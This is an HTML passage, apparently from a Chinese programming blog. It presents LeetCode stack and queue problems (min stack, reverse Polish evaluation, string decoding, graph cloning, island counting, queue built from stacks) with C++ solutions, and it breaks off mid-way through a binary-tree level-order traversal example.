      <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>栈的特点是后入先出，根据这个特点可以临时保存一些数据，之后用到依次再弹出来，常用于 DFS 深度搜索</p><p>队列一般常用于 BFS 广度搜索，类似一层一层的搜索</p><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><h4 id="155-最小栈"><a href="#155-最小栈" class="headerlink" title="155. 最小栈"></a><a href="https://leetcode-cn.com/problems/min-stack/">155. 最小栈</a></h4><blockquote><p>设计一个支持 push ，pop ，top 操作，并能在常数时间内检索到最小元素的栈。</p><p>push(x) —— 将元素 x 推入栈中。<br>pop() —— 删除栈顶的元素。<br>top() —— 获取栈顶元素。<br>getMin() —— 检索栈中的最小元素。</p></blockquote><h6 id="辅助栈"><a href="#辅助栈" class="headerlink" title="辅助栈"></a>辅助栈</h6><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MinStack</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/** initialize your data structure here. */</span></span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; minStack;</span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; dataStack;</span><br><span class="line">    <span class="built_in">MinStack</span>() {</span><br><span class="line">       minStack.<span class="built_in">push</span>(INT_MAX);</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span> </span>{</span><br><span class="line">        dataStack.<span class="built_in">push</span>(x);</span><br><span class="line">        minStack.<span class="built_in">push</span>(<span class="built_in">min</span>(minStack.<span class="built_in">top</span>(),x));</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pop</span><span class="params">()</span> </span>{</span><br><span class="line">        minStack.<span class="built_in">pop</span>();</span><br><span class="line">        dataStack.<span class="built_in">pop</span>();</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">top</span><span class="params">()</span> </span>{</span><br><span class="line">        <span class="keyword">return</span> dataStack.<span class="built_in">top</span>();</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getMin</span><span class="params">()</span> </span>{</span><br><span class="line">        <span class="keyword">return</span> minStack.<span class="built_in">top</span>();</span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MinStack object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MinStack* obj = new MinStack();</span></span><br><span class="line"><span class="comment"> * obj-&gt;push(x);</span></span><br><span class="line"><span class="comment"> * obj-&gt;pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj-&gt;top();</span></span><br><span class="line"><span class="comment"> * int param_4 = obj-&gt;getMin();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></tbody></table></figure><h4 id="150-逆波兰表达式求值"><a href="#150-逆波兰表达式求值" class="headerlink" title="150. 逆波兰表达式求值"></a><a href="https://leetcode-cn.com/problems/evaluate-reverse-polish-notation/">150. 逆波兰表达式求值</a></h4><blockquote><p>根据<a href="https://baike.baidu.com/item/%E9%80%86%E6%B3%A2%E5%85%B0%E5%BC%8F/128437"> 逆波兰表示法</a>，求表达式的值。</p><p>有效的运算符包括 <code>+</code>, <code>-</code>, <code>*</code>, <code>/</code> 。每个运算对象可以是整数，也可以是另一个逆波兰表达式。</p></blockquote><p>思路：通过栈保存原来的元素，遇到表达式弹出运算，再推入结果，重复这个过程</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">evalRPN</span><span class="params">(vector&lt;string&gt;&amp; tokens)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(tokens.<span class="built_in">empty</span>())</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; st;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tokens.<span class="built_in">size</span>();i++)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(tokens[i]==<span class="string">"+"</span>||tokens[i]==<span class="string">"-"</span>||tokens[i]==<span class="string">"*"</span>||tokens[i]==<span class="string">"/"</span>)</span><br><span class="line">                {</span><br><span class="line">                  </span><br><span class="line">                    <span class="keyword">if</span>(st.<span class="built_in">size</span>()&lt;<span class="number">2</span>)</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">                    <span class="keyword">auto</span> b=st.<span class="built_in">top</span>();</span><br><span class="line">                    st.<span class="built_in">pop</span>();</span><br><span class="line">                    <span class="keyword">auto</span> a=st.<span class="built_in">top</span>();</span><br><span class="line">                    st.<span class="built_in">pop</span>();</span><br><span class="line">                    <span class="type">int</span> res;</span><br><span class="line">                    <span class="keyword">switch</span>(tokens[i][<span class="number">0</span>])</span><br><span class="line">                    {</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">'+'</span>:</span><br><span class="line">                            res=a+b;                           </span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">'-'</span>:</span><br><span class="line">                            res=a-b;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">'*'</span>:</span><br><span class="line">                            res=a*b;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">'/'</span>:</span><br><span class="line">                            res=a/b;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    }</span><br><span class="line">                    st.<span class="built_in">push</span>(res);</span><br><span class="line">                }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                st.<span class="built_in">push</span>(<span class="built_in">atoi</span>(tokens[i].<span class="built_in">c_str</span>()));</span><br><span class="line"></span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> st.<span class="built_in">top</span>();</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="394-字符串解码"><a href="#394-字符串解码" class="headerlink" title="394. 字符串解码"></a><a href="https://leetcode-cn.com/problems/decode-string/">394. 字符串解码</a></h4><blockquote><p>给定一个经过编码的字符串，返回它解码后的字符串。</p><p>编码规则为: k[encoded_string]，表示其中方括号内部的 encoded_string 正好重复 k 次。注意 k 保证为正整数。</p><p>你可以认为输入字符串总是有效的；输入字符串中没有额外的空格，且输入的方括号总是符合格式要求的。</p><p>此外，你可以认为原始数据不包含数字，所有的数字只表示重复的次数 k ，例如不会出现像 3a 或 2[4] 的输入。</p></blockquote><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">decodeString</span><span class="params">(string s)</span> </span>{</span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">        stack&lt;string&gt; strs;</span><br><span class="line">        string res=<span class="string">""</span>;</span><br><span class="line">        <span class="type">int</span> num=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i++)</span><br><span class="line">        {</span><br><span class="line">            <span class="type">char</span> ch=s[i];</span><br><span class="line">            <span class="keyword">if</span>(ch&gt;=<span class="string">'0'</span>&amp;&amp;ch&lt;=<span class="string">'9'</span>)</span><br><span class="line">            {</span><br><span class="line">                <span class="comment">//多位数情况处理</span></span><br><span class="line">                num=num*<span class="number">10</span>+ch-<span class="string">'0'</span>;</span><br><span class="line"></span><br><span class="line">            }<span class="keyword">else</span> <span class="keyword">if</span>((ch &gt;= <span class="string">'a'</span> &amp;&amp; ch &lt;= <span class="string">'z'</span>) ||(ch &gt;= <span class="string">'A'</span> &amp;&amp; ch &lt;= <span class="string">'Z'</span>))</span><br><span class="line">            {</span><br><span class="line">                res+=ch;</span><br><span class="line"></span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(ch==<span class="string">'['</span>)</span><br><span class="line">            {</span><br><span class="line">                nums.<span class="built_in">push</span>(num);</span><br><span class="line">                num=<span class="number">0</span>;</span><br><span class="line">                strs.<span class="built_in">push</span>(res);</span><br><span class="line">                res=<span class="string">""</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                <span class="type">int</span> j=nums.<span class="built_in">top</span>();</span><br><span class="line">                nums.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">while</span>(j--)</span><br><span class="line">                {</span><br><span class="line">                    strs.<span class="built_in">top</span>()+=res;</span><br><span class="line">                }</span><br><span class="line">                res=strs.<span class="built_in">top</span>();</span><br><span class="line">                <span class="comment">//之后若还是字母，就会直接加到res之后，因为它们是同一级的运算</span></span><br><span class="line">                <span class="comment">//若是左括号，res会被压入strs栈，作为上一层的运算</span></span><br><span class="line">                strs.<span class="built_in">pop</span>();</span><br><span class="line">            }</span><br><span class="line">            </span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="94-二叉树的中序遍历"><a href="#94-二叉树的中序遍历" class="headerlink" title="94. 二叉树的中序遍历"></a><a href="https://leetcode-cn.com/problems/binary-tree-inorder-traversal/">94. 二叉树的中序遍历</a></h4><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:   </span><br><span class="line">   </span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode* root)</span> </span>{</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt;ans;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> ans;       </span><br><span class="line">        stack&lt;TreeNode*&gt; st;</span><br><span class="line">        <span class="keyword">auto</span> cur=root;</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">NULL</span>||!st.<span class="built_in">empty</span>())</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">while</span>(cur!=<span class="literal">NULL</span>)</span><br><span class="line">            {</span><br><span class="line">                st.<span class="built_in">push</span>(cur);</span><br><span class="line">                cur=cur-&gt;left;</span><br><span class="line">            }</span><br><span class="line">            cur=st.<span class="built_in">top</span>();</span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">            ans.<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">            cur=cur-&gt;right;</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">         </span><br><span class="line">       </span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="133-克隆图"><a href="#133-克隆图" class="headerlink" title="133. 克隆图"></a><a href="https://leetcode-cn.com/problems/clone-graph/">133. 克隆图</a></h4><blockquote><p>给你无向 <strong><a href="https://baike.baidu.com/item/%E8%BF%9E%E9%80%9A%E5%9B%BE/6460995?fr=aladdin">连通</a></strong> 图中一个节点的引用，请你返回该图的 <a href="https://baike.baidu.com/item/%E6%B7%B1%E6%8B%B7%E8%B4%9D/22785317?fr=aladdin"><strong>深拷贝</strong></a>（克隆）。</p><p>图中的每个节点都包含它的值 <code>val</code>（<code>int</code>） 和其邻居的列表（<code>list[Node]</code>）。</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span> {</span><br><span class="line"> <span class="keyword">public</span> <span class="type">int</span> val;</span><br><span class="line"> <span class="keyword">public</span> List&lt;Node&gt; neighbors;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></blockquote><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// Definition for a Node.</span></span><br><span class="line"><span class="comment">class Node {</span></span><br><span class="line"><span class="comment">public:</span></span><br><span class="line"><span class="comment">    int val;</span></span><br><span class="line"><span class="comment">    vector&lt;Node*&gt; neighbors;</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    Node() {</span></span><br><span class="line"><span class="comment">        val = 0;</span></span><br><span class="line"><span class="comment">        neighbors = vector&lt;Node*&gt;();</span></span><br><span class="line"><span class="comment">    }</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    Node(int _val) {</span></span><br><span class="line"><span class="comment">        val = _val;</span></span><br><span class="line"><span class="comment">        neighbors = vector&lt;Node*&gt;();</span></span><br><span class="line"><span class="comment">    }</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    Node(int _val, vector&lt;Node*&gt; _neighbors) {</span></span><br><span class="line"><span class="comment">        val = _val;</span></span><br><span class="line"><span class="comment">        neighbors = _neighbors;</span></span><br><span class="line"><span class="comment">    }</span></span><br><span class="line"><span class="comment">};</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    unordered_map&lt;Node*,Node*&gt; mp;</span><br><span class="line">    <span class="function">Node* <span class="title">cloneGraph</span><span class="params">(Node* node)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(node==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        <span class="keyword">if</span>(mp.<span class="built_in">count</span>(node))</span><br><span class="line">            <span class="keyword">return</span> mp[node];</span><br><span class="line">        <span class="type">const</span> <span class="keyword">auto</span> newnode=<span class="keyword">new</span> <span class="built_in">Node</span>(node-&gt;val);</span><br><span class="line">        mp[node]=newnode;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> n:node-&gt;neighbors)</span><br><span class="line">        {</span><br><span class="line">            mp[node]-&gt;neighbors.<span class="built_in">push_back</span>(<span class="built_in">cloneGraph</span>(n));</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> mp[node];</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="200-岛屿数量"><a href="#200-岛屿数量" class="headerlink" title="200. 岛屿数量"></a><a href="https://leetcode-cn.com/problems/number-of-islands/">200. 岛屿数量</a></h4><blockquote><p>给你一个由 ‘1’（陆地）和 ‘0’（水）组成的的二维网格，请你计算网格中岛屿的数量。</p><p>岛屿总是被水包围，并且每座岛屿只能由水平方向或竖直方向上相邻的陆地连接形成。</p><p>此外，你可以假设该网格的四条边均被水包围。</p></blockquote><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">numIslands</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; grid)</span> </span>{</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; grid.<span class="built_in">size</span>(); i++){</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; grid[<span class="number">0</span>].<span class="built_in">size</span>(); j++){</span><br><span class="line">                <span class="keyword">if</span>(grid[i][j] == <span class="string">'1'</span>){</span><br><span class="line">                    <span class="built_in">dfs</span>(grid, i, j);</span><br><span class="line">                    count++;</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">   }</span><br><span class="line">   <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; grid, <span class="type">int</span> i, <span class="type">int</span> j)</span></span>{</span><br><span class="line">       <span class="keyword">if</span>(i &lt; <span class="number">0</span> || i &gt;= grid.<span class="built_in">size</span>() || j &lt; <span class="number">0</span> || j &gt;= grid[<span class="number">0</span>].<span class="built_in">size</span>() || grid[i][j] != <span class="string">'1'</span>){</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       }</span><br><span class="line"></span><br><span class="line">       grid[i][j] = <span class="string">'2'</span>;</span><br><span class="line">       <span class="built_in">dfs</span>(grid, i + <span class="number">1</span>, j);</span><br><span class="line">       <span class="built_in">dfs</span>(grid, i - <span class="number">1</span>, j);</span><br><span class="line">       <span class="built_in">dfs</span>(grid, i, j + <span class="number">1</span>);</span><br><span class="line">       <span class="built_in">dfs</span>(grid, i, j - <span class="number">1</span>);</span><br><span class="line">   }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="84-柱状图中最大的矩形"><a href="#84-柱状图中最大的矩形" class="headerlink" title="84. 柱状图中最大的矩形"></a><a href="https://leetcode-cn.com/problems/largest-rectangle-in-histogram/">84. 柱状图中最大的矩形</a></h4><h2 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h2><h4 id="232-用栈实现队列"><a href="#232-用栈实现队列" class="headerlink" title="232. 用栈实现队列"></a><a href="https://leetcode-cn.com/problems/implement-queue-using-stacks/">232. 用栈实现队列</a></h4><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyQueue</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; s1,s2;</span><br><span class="line">    <span class="type">int</span> front;</span><br><span class="line">    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">    <span class="built_in">MyQueue</span>() {</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Push element x to the back of queue. */</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(s<span class="number">1.</span><span class="built_in">empty</span>())</span><br><span class="line">            front=x;</span><br><span class="line">        s<span class="number">1.</span><span class="built_in">push</span>(x);</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Removes the element from in front of queue and returns that element. */</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">pop</span><span class="params">()</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(s<span class="number">2.</span><span class="built_in">empty</span>())</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">while</span>(!s<span class="number">1.</span><span class="built_in">empty</span>())</span><br><span class="line">            {</span><br><span class="line">                s<span class="number">2.</span><span class="built_in">push</span>(s<span class="number">1.</span><span class="built_in">top</span>());</span><br><span class="line">                s<span class="number">1.</span><span class="built_in">pop</span>();</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="type">int</span> ret =s<span class="number">2.</span><span class="built_in">top</span>();</span><br><span class="line">        s<span class="number">2.</span><span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Get the front element. */</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">peek</span><span class="params">()</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(!s<span class="number">2.</span><span class="built_in">empty</span>())</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">return</span> s<span class="number">2.</span><span class="built_in">top</span>();</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> front;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Returns whether the queue is empty. */</span></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(s<span class="number">1.</span><span class="built_in">empty</span>()&amp;&amp;s<span class="number">2.</span><span class="built_in">empty</span>())</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyQueue object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyQueue* obj = new MyQueue();</span></span><br><span class="line"><span class="comment"> * obj-&gt;push(x);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj-&gt;pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj-&gt;peek();</span></span><br><span class="line"><span class="comment"> * bool param_4 = obj-&gt;empty();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></tbody></table></figure><h4 id="102-二叉树的层序遍历"><a href="#102-二叉树的层序遍历" class="headerlink" title="102. 二叉树的层序遍历"></a><a href="https://leetcode-cn.com/problems/binary-tree-level-order-traversal/">102. 二叉树的层序遍历</a></h4><blockquote><p>给你一个二叉树，请你返回其按 <strong>层序遍历</strong> 得到的节点值。 （即逐层地，从左到右访问所有节点）。</p></blockquote><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 